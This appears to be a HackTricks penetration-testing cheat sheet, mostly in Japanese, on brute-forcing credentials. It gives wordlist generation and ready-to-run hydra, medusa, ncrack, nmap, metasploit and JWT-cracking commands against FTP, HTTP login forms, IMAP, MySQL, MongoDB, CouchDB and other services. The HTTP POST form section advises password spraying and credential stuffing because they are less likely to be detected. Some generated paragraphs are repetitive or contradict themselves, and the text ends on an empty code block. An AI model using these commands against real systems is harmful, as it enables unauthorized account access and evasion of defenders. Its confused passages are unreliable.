# ブルートフォース - チートシート

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか、またはHackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

## デフォルトの資格情報

使用されている技術のデフォルトの資格情報をGoogleで検索するか、次のリンクを試してみてください：

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl is a tool used for generating custom wordlists by scraping websites or documents. It can be helpful in brute-forcing passwords or performing dictionary attacks. Cewl works by analyzing the given input and extracting relevant words based on various criteria such as word length, frequency, and patterns.

To use Cewl, you need to provide it with a target URL or a file containing text. The tool then crawls the target website or analyzes the document to extract words. It can also follow links and recursively scrape multiple pages.

Cewl offers several options to customize the wordlist generation process. You can specify the minimum and maximum word length, exclude certain words or patterns, and even use regular expressions to filter the extracted words. Additionally, Cewl supports different output formats, allowing you to save the generated wordlist in various file types.

Using Cewl can be beneficial during penetration testing or password cracking activities. By creating a wordlist tailored to the target, you can increase the chances of success in a brute-force attack. However, it's important to note that using Cewl for malicious purposes is illegal and unethical. Always ensure you have proper authorization before using such tools.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

被害者の情報（名前、日付など）に基づいてパスワードを生成します。
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wisterは、単語リスト生成ツールであり、特定のターゲットに関連する使用に適したユニークで理想的な単語リストを作成するために、与えられた単語から複数のバリエーションを作成することができます。
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### ワードリスト

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## サービス

サービス名でアルファベット順に並べられています。

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a protocol used by Apache Tomcat to communicate with web servers. It is similar to the HTTP protocol but is more efficient for communication between the web server and the application server.

#### Brute Forcing AJP

To brute force AJP, you can use tools like `ajpfuzzer` or `ajp-buster`. These tools allow you to test for weak credentials or vulnerabilities in the AJP protocol.

Here is an example of how to use `ajpfuzzer`:

```bash
ajpfuzzer -H <target_host> -p <target_port> -u <username> -w <wordlist>
```

Replace `<target_host>` with the IP address or hostname of the target server, `<target_port>` with the AJP port (usually 8009), `<username>` with the username you want to test, and `<wordlist>` with the path to a wordlist file containing possible passwords.

Using `ajp-buster` is similar:

```bash
ajp-buster -H <target_host> -p <target_port> -U <username> -P <password>
```

Replace `<target_host>` and `<target_port>` with the target server's IP address or hostname and AJP port, and `<username>` and `<password>` with the credentials you want to test.

Remember to always obtain proper authorization before performing any brute force attacks.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
# Cassandra

Cassandraは、分散型データベース管理システムであり、Apache Software Foundationによって開発されました。Cassandraは、高い可用性とスケーラビリティを提供することを目的としています。

## ブルートフォース攻撃

ブルートフォース攻撃は、Cassandraデータベースに対して非常に効果的な攻撃手法です。この攻撃では、すべての可能な組み合わせを試し、正しい認証情報を見つけることを目指します。

以下は、Cassandraデータベースに対するブルートフォース攻撃の手順です。

1. ユーザー名のリストを作成します。
2. パスワードのリストを作成します。
3. ユーザー名とパスワードの組み合わせを順番に試します。
4. 正しい認証情報が見つかるまで、組み合わせを繰り返します。

ブルートフォース攻撃は、パスワードが弱い場合やデフォルトの認証情報が使用されている場合に特に効果的です。したがって、Cassandraデータベースのセキュリティを強化するためには、強力なパスワードポリシーを実装し、デフォルトの認証情報を変更することが重要です。

また、ブルートフォース攻撃を防ぐために、Cassandraデータベースにはログイン試行回数の制限やアカウントロックアウトの機能を設定することも推奨されます。これにより、攻撃者が大量の試行を行うことを防ぐことができます。
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
# CouchDB

CouchDBは、ドキュメント指向のデータベースであり、HTTPプロトコルを使用してデータにアクセスすることができます。CouchDBは、データベースのブルートフォース攻撃に対して脆弱な場合があります。

## ブルートフォース攻撃

ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードや認証トークンなどの秘密情報を推測するために使用されます。CouchDBのブルートフォース攻撃では、一連のパスワードを試し、正しいパスワードを見つけるまで続けます。

以下は、CouchDBのブルートフォース攻撃を実行するための手順です。

1. ユーザー名とパスワードのリストを作成します。
2. リスト内の各ユーザー名とパスワードの組み合わせを使用してCouchDBにログインを試みます。
3. 正しいユーザー名とパスワードの組み合わせが見つかるまで、ステップ2を繰り返します。

ブルートフォース攻撃は、パスワードが強力である場合や、アカウントがロックアウトされるまで続けられる場合に効果的です。しかし、CouchDBはデフォルトで連続した認証試行の制限を設けているため、攻撃者は制限に達する前に攻撃を中止する必要があります。

## 防御策

CouchDBのブルートフォース攻撃からデータを保護するためには、以下の防御策を実装することが重要です。

- 強力なパスワードポリシーを採用し、複雑なパスワードを使用します。
- ログイン試行回数の制限を設定し、一定回数の認証試行後にアカウントをロックアウトするようにします。
- IPアドレスベースのブラックリストやホワイトリストを使用して、不正なアクセスを制限します。
- セキュリティパッチやアップデートを定期的に適用し、最新のセキュリティ対策を保ちます。

これらの防御策を実装することで、CouchDBのブルートフォース攻撃からデータを保護することができます。
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
## Docker レジストリ

Docker レジストリは、Docker イメージを保存および管理するための中央リポジトリです。Docker イメージは、アプリケーションやサービスのコンテナ化されたバージョンを表します。

Docker レジストリには、公開レジストリとプライベートレジストリの2つのタイプがあります。公開レジストリは、誰でもアクセスできる一般的なイメージのリポジトリです。一方、プライベートレジストリは、特定の組織やユーザーによって制御されるイメージのリポジトリです。

Docker レジストリへのアクセスを制限するために、認証情報を使用することができます。一般的な認証方法には、ユーザー名とパスワード、トークン、または SSH 鍵があります。

Docker レジストリへの不正アクセスを試みる際には、ブルートフォース攻撃が使用されることがあります。ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、すべての可能な組み合わせを試行し、正しい認証情報を見つけることを目指します。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、アカウントロックアウト機能を有効にすることが重要です。また、2要素認証やIP制限などの追加のセキュリティ対策も検討することができます。

Docker レジストリのセキュリティを確保するためには、定期的な脆弱性スキャンやログ監視、アクセス制御の確立などの対策を実施することが重要です。
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
# Elasticsearch

Elasticsearch is a distributed, RESTful search and analytics engine built on top of Apache Lucene. It is commonly used for log and event data analysis, full-text search, and real-time analytics. Elasticsearch provides a scalable and efficient solution for storing, searching, and analyzing large volumes of data.

## Brute-Force Attacks

Brute-force attacks are a common method used to gain unauthorized access to Elasticsearch instances. In a brute-force attack, an attacker systematically tries all possible combinations of usernames and passwords until the correct credentials are found.

To protect against brute-force attacks, it is important to implement strong authentication mechanisms and enforce password complexity requirements. Additionally, rate limiting and account lockout policies can be implemented to prevent multiple failed login attempts.

## Tools for Brute-Force Attacks

There are several tools available for conducting brute-force attacks against Elasticsearch. Some popular tools include:

- **Patator**: A multi-purpose brute-forcing tool that supports various protocols, including Elasticsearch.
- **Hydra**: A powerful network login cracker that can be used to perform brute-force attacks against Elasticsearch.
- **Medusa**: A speedy, parallel, and modular login brute-forcer that supports Elasticsearch.

It is important to note that using these tools for unauthorized access is illegal and unethical. They should only be used for legitimate purposes, such as penetration testing or security research.

## Prevention Techniques

To prevent brute-force attacks against Elasticsearch, consider implementing the following techniques:

- **Strong Passwords**: Enforce the use of strong, complex passwords that are resistant to brute-force attacks.
- **Account Lockout**: Implement an account lockout policy that temporarily locks user accounts after a certain number of failed login attempts.
- **Rate Limiting**: Implement rate limiting mechanisms to restrict the number of login attempts within a specific time frame.
- **Monitoring and Logging**: Monitor Elasticsearch logs for suspicious activity and implement logging mechanisms to track failed login attempts.
- **Two-Factor Authentication**: Implement two-factor authentication to add an extra layer of security to the authentication process.

By implementing these prevention techniques, you can significantly reduce the risk of brute-force attacks and enhance the security of your Elasticsearch instances.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP（File Transfer Protocol）は、ファイルの転送に使用されるプロトコルです。FTPサーバーに対してブルートフォース攻撃を行うことで、正当な認証情報を推測し、アクセスを試みることができます。

#### ブルートフォース攻撃

ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、すべての可能な組み合わせを試すことで、正当な認証情報を見つけ出す手法です。FTPサーバーに対してブルートフォース攻撃を行う場合、一連のユーザー名とパスワードの組み合わせを試し、正しい組み合わせを見つけることを目指します。

#### ブルートフォース攻撃の手法

以下に、FTPサーバーに対するブルートフォース攻撃の一般的な手法を示します。

1. 辞書攻撃：事前に作成された辞書ファイルを使用して、一連のユーザー名とパスワードの組み合わせを試します。辞書ファイルには、一般的なパスワードや一般的なユーザー名が含まれていることがあります。

2. ブルートフォース攻撃：すべての可能な組み合わせを試すため、ユーザー名とパスワードの組み合わせを生成します。この手法は非常に時間がかかる場合がありますが、正しい組み合わせを見つける可能性が高くなります。

3. ハイブリッド攻撃：辞書攻撃とブルートフォース攻撃を組み合わせた手法です。まず、辞書攻撃を試し、成功しなかった場合にはブルートフォース攻撃を行います。

#### ブルートフォース攻撃のツール

以下に、FTPサーバーに対するブルートフォース攻撃に使用できる一般的なツールを示します。

- Hydra：多くのプロトコルに対応したブルートフォース攻撃ツールです。FTPサーバーに対しても使用することができます。

- Medusa：ブルートフォース攻撃に特化したツールで、高速かつ効率的な攻撃を行うことができます。

- Ncrack：ネットワーク認証クラッキングツールで、FTPサーバーに対してブルートフォース攻撃を行うことができます。

これらのツールは、正当な認証情報を見つけ出すために使用されますが、合法的な目的でのみ使用することが重要です。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### HTTPジェネリックブルート

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTPベーシック認証
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - ポストフォーム

In this technique, the attacker uses a brute force attack to guess the credentials of a login form on a website. The attacker sends multiple HTTP POST requests with different combinations of usernames and passwords to the login endpoint of the website.

この技術では、攻撃者はウェブサイトのログインフォームの資格情報を推測するためにブルートフォース攻撃を使用します。攻撃者は、異なるユーザ名とパスワードの組み合わせを使用して、ウェブサイトのログインエンドポイントに複数のHTTP POSTリクエストを送信します。

The attacker can automate this process by using scripts or tools that can generate and send these requests automatically. By analyzing the responses received from the server, the attacker can determine if a particular combination of credentials is valid or not.

攻撃者は、スクリプトやツールを使用して、このプロセスを自動化することができます。これらのリクエストを自動的に生成して送信することができます。サーバーから受け取ったレスポンスを分析することで、攻撃者は特定の資格情報の組み合わせが有効かどうかを判断することができます。

It is important to note that brute forcing login forms is a time-consuming process and may trigger security mechanisms such as account lockouts or rate limiting. Therefore, it is recommended to use techniques like password spraying or credential stuffing, which are more efficient and less likely to be detected.

ログインフォームのブルートフォース攻撃は時間がかかるため、アカウントのロックアウトやレート制限などのセキュリティメカニズムをトリガーする可能性があります。そのため、パスワードスプレー攻撃やクレデンシャルスタッフィング攻撃などのより効率的で検出されにくい技術を使用することを推奨します。
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
For http**s** you have to change from "http-post-form" to "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
IMAP (Internet Message Access Protocol) is a protocol used for retrieving and managing email messages on a mail server. It allows users to access their email accounts remotely and perform various operations such as reading, deleting, and moving messages.

#### Brute Forcing IMAP Credentials

Brute forcing is a common technique used to guess passwords by systematically trying all possible combinations until the correct one is found. In the context of IMAP, brute forcing can be used to gain unauthorized access to email accounts by guessing the correct username and password combination.

To perform a brute force attack on IMAP credentials, you can use tools like Hydra or Medusa. These tools automate the process of trying different username and password combinations against the IMAP server.

Here is an example command using Hydra to brute force IMAP credentials:

```plaintext
hydra -L users.txt -P passwords.txt imap://target.com
```

In this command, `users.txt` and `passwords.txt` are files containing a list of usernames and passwords, respectively. `target.com` is the target IMAP server.

It is important to note that brute forcing is an aggressive and time-consuming technique. It can be detected by intrusion detection systems (IDS) and may result in account lockouts or other security measures. Therefore, it is recommended to use brute forcing techniques responsibly and with proper authorization.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
IRC（Internet Relay Chat）は、インターネット上でリアルタイムのテキストベースのコミュニケーションを可能にするプロトコルです。IRCは、チャットルームと呼ばれるグループチャットの形式を使用し、ユーザーがテキストメッセージを送信および受信することができます。IRCは、オープンなプロトコルであり、クライアントソフトウェアを使用してアクセスすることができます。

IRCサーバーに対するブルートフォース攻撃は、ユーザー名とパスワードの組み合わせを総当たりで試行し、正しい認証情報を見つけることを試みる攻撃手法です。この攻撃は、弱いパスワードを使用しているユーザーアカウントを特定するために使用されます。

ブルートフォース攻撃を実行するためには、ブルートフォースツールを使用する必要があります。これらのツールは、自動化された方法で大量のユーザー名とパスワードの組み合わせを試行することができます。攻撃者は、一般的なパスワードや辞書攻撃を使用して、より効率的に攻撃を行うことができます。

ブルートフォース攻撃は、セキュリティ対策が不十分なシステムに対して非常に効果的な攻撃手法です。したがって、ユーザーは強力なパスワードを使用し、2要素認証などの追加のセキュリティ対策を実装することが重要です。また、システム管理者はブルートフォース攻撃を検知および防御するための適切な対策を講じる必要があります。
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI (Internet Small Computer System Interface) は、TCP/IP ネットワークを介してブロックベースのデータストレージを提供するプロトコルです。iSCSI を使用すると、リモートのストレージデバイスをローカルのホストに接続し、データの読み書きを行うことができます。

iSCSI は、ブロックレベルのアクセスを提供するため、ファイルシステムを使用せずにデータを直接読み書きすることができます。これにより、高速なデータ転送が可能となります。

iSCSI のセキュリティは、CHAP（Challenge-Handshake Authentication Protocol）やIPsec（Internet Protocol Security）などの認証および暗号化メカニズムを使用して確保することができます。

iSCSI の攻撃手法としては、ブルートフォース攻撃があります。これは、パスワードを推測するために総当たりで試行する方法です。ブルートフォース攻撃は、弱いパスワードを使用している場合に有効な攻撃手法となります。

iSCSI のセキュリティを強化するためには、強力なパスワードポリシーを実装し、パスワードの推測を困難にすることが重要です。また、セキュリティプロトコルを適切に設定し、不正なアクセスを防止する必要があります。
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JWT（JSON Web Token）は、認証と情報の安全な伝送を可能にするためのオープンスタンダードです。JWTは、クライアントとサーバー間でデータを安全にやり取りするために使用されます。

JWTは、3つのセクションから構成されています：ヘッダ、ペイロード、署名。ヘッダは、トークンのタイプと使用する署名アルゴリズムを指定します。ペイロードは、トークンに含まれる情報を格納します。署名は、トークンの信頼性を確保するために使用されます。

JWTの一般的な攻撃手法の1つは、ブルートフォース攻撃です。ブルートフォース攻撃では、すべての可能な組み合わせを試して、正しい署名を見つけることを試みます。これにより、攻撃者はトークンを偽造して、認証をバイパスすることができます。

ブルートフォース攻撃を防ぐためには、強力なパスワードや署名キーを使用し、適切なセキュリティ対策を実施する必要があります。また、トークンの有効期限を短く設定することも重要です。これにより、攻撃者が十分な時間を持ってブルートフォース攻撃を行うことができなくなります。

さらに、JWTの署名アルゴリズムを慎重に選択することも重要です。強力な署名アルゴリズムを使用することで、攻撃者が署名を解読することを困難にします。

最後に、JWTのセキュリティを確保するためには、トークンの送信と保存にHTTPSを使用することが重要です。HTTPSは、データの暗号化と送信元の認証を提供するため、トークンの漏洩や改ざんを防ぐのに役立ちます。
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP（Lightweight Directory Access Protocol）は、ディレクトリサービスにアクセスするためのプロトコルです。ディレクトリサービスは、ユーザー、グループ、コンピュータなどの情報を格納するために使用されます。LDAPは、ディレクトリサービスへのクエリや変更の要求を処理するために使用されます。

LDAPのブルートフォース攻撃は、辞書攻撃とも呼ばれ、LDAPサーバーに対してユーザー名とパスワードの組み合わせを総当たりで試行することです。この攻撃は、弱いパスワードを使用しているユーザーアカウントを特定するために使用されます。

ブルートフォース攻撃を実行するためには、辞書ファイルを作成し、LDAPサーバーに対してユーザー名とパスワードの組み合わせを順番に試行します。攻撃者は、辞書ファイルを作成する際に、一般的なパスワードや一般的なユーザー名のリストを使用することがあります。

ブルートフォース攻撃は、パスワードポリシーが弱い場合や、強力なパスワードを使用することが困難な状況で特に有効です。攻撃者は、パスワードの推測を試みることで、システムへの不正アクセスを試みることができます。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、アカウントロックアウト機能を有効にすることが重要です。また、二要素認証やIP制限などの追加のセキュリティ対策も有効です。
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT（Message Queuing Telemetry Transport）は、軽量なメッセージングプロトコルであり、IoT（Internet of Things）デバイス間の通信に広く使用されています。このプロトコルは、低帯域幅や不安定なネットワーク環境でも効率的に動作します。

MQTTは、パブリッシャーとサブスクライバーの2つの役割を持つクライアント間の非同期通信を可能にします。パブリッシャーはメッセージをトピックにパブリッシュし、サブスクライバーは特定のトピックにサブスクライブしてメッセージを受信します。

MQTTのセキュリティに関しては、以下のポイントに注意する必要があります。

- ユーザー名とパスワードの認証を使用して、クライアントの正当性を確認します。
- TLS（Transport Layer Security）を使用して通信を暗号化します。
- トピックのアクセス制御リスト（ACL）を設定して、不正なアクセスを制限します。

MQTTのブルートフォース攻撃は、パスワードの推測を試みることで行われます。攻撃者は一連のパスワードを試し、正しいパスワードを見つけることを目指します。この攻撃を防ぐためには、強力なパスワードポリシーを実装し、アカウントロックアウト機能を有効にすることが重要です。

ブルートフォース攻撃を検出するためには、ログイン試行の異常な増加を監視し、異常なアクティビティを検知するセキュリティツールを使用することが推奨されます。また、IPアドレスのブラックリストやCAPTCHAの導入も有効な対策です。

MQTTのセキュリティを強化するためには、以下の対策を実施することが重要です。

- デフォルトのユーザー名とパスワードを変更する。
- TLSを使用して通信を暗号化する。
- トピックのアクセス制御リスト（ACL）を設定する。
- ブルートフォース攻撃を防ぐために強力なパスワードポリシーを実装する。
- ログイン試行の異常な増加を監視し、異常なアクティビティを検知するセキュリティツールを使用する。
- IPアドレスのブラックリストやCAPTCHAの導入を検討する。

これらの対策を実施することで、MQTTのセキュリティを強化し、悪意のある攻撃から保護することができます。
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
# モンゴ

MongoDBは、NoSQLデータベースであり、ブルートフォース攻撃の潜在的な標的です。ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードや認証情報を推測するために連続的に試行する攻撃手法です。

モンゴDBのブルートフォース攻撃を防ぐためには、以下の対策を講じることが重要です。

- 強力なパスワードポリシーを実施する：長さ、複雑さ、一意性の要件を設定し、パスワードの再利用を防止します。
- パスワードロックアウトポリシーを設定する：一定回数の誤ったパスワード試行後にアカウントをロックするように設定します。
- 2要素認証（2FA）を有効にする：追加のセキュリティレイヤーとして、2FAを使用します。
- IP制限を設定する：特定のIPアドレスからのアクセスのみを許可するように設定します。
- ネットワークセキュリティグループを使用する：ネットワークセキュリティグループを使用して、不正なトラフィックをブロックします。

これらの対策を実施することで、モンゴDBのブルートフォース攻撃を防ぐことができます。
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQLは、オープンソースのリレーショナルデータベース管理システムです。多くのウェブアプリケーションやウェブサイトで使用されており、データの保存と取得に使用されます。

MySQLのブルートフォース攻撃は、パスワードを推測してアカウントに不正にアクセスする試みです。以下に、MySQLのブルートフォース攻撃に対するいくつかの一般的な手法を示します。

#### 1. 辞書攻撃

辞書攻撃は、事前に作成されたパスワードリストを使用してブルートフォース攻撃を行う方法です。攻撃者は、一般的なパスワードや一般的な単語の組み合わせを試し、正しいパスワードを見つけることを試みます。

#### 2. ブルートフォース攻撃ツールの使用

ブルートフォース攻撃ツールを使用することで、攻撃者は自動的にパスワードの推測を行うことができます。これらのツールは、パスワードの長さ、文字セット、および他のパラメータを設定することができます。

#### 3. パスワードポリシーの弱点の利用

パスワードポリシーの弱点を利用することで、攻撃者は推測しやすいパスワードを見つけることができます。一部のシステムでは、パスワードの複雑さや長さに制限がない場合があります。

#### 4. ユーザー名の推測

攻撃者は、一般的なユーザー名や一般的なパターンを使用してユーザー名を推測することができます。これにより、攻撃者はパスワードの推測範囲を狭めることができます。

#### 5. ログイン試行回数の制限の回避

一部のシステムでは、ログイン試行回数が制限されています。攻撃者は、複数のIPアドレスやプロキシを使用してこの制限を回避することができます。

これらの手法を使用してMySQLのブルートフォース攻撃を行うことは、違法であり、個人や組織に重大な被害をもたらす可能性があります。セキュリティを強化するためには、強力なパスワードポリシーの実装、ログイン試行回数の制限、およびセキュリティパッチの適用が重要です。
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
# OracleSQL

OracleSQLは、Oracleデータベースに対してブルートフォース攻撃を実行するためのテクニックです。ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードや認証情報を推測するために、すべての可能な組み合わせを試す手法です。

OracleSQLにおけるブルートフォース攻撃は、以下の手順で実行されます。

1. ユーザー名のリストを作成します。
2. パスワードのリストを作成します。
3. ユーザー名とパスワードの組み合わせを総当たりで試します。
4. 正しい組み合わせが見つかるまで、繰り返し試行します。

ブルートフォース攻撃は、パスワードが弱い場合やデフォルトの認証情報が使用されている場合に特に効果的です。しかし、Oracleデータベースは一般的にセキュリティが強固であり、ブルートフォース攻撃に対して防御策が取られていることが多いです。

ブルートフォース攻撃は、合法的なセキュリティテストやペネトレーションテストの一環として使用されることもありますが、不正な目的で使用することは違法です。セキュリティテストを実施する場合は、適切な許可を得て行う必要があります。
```bash
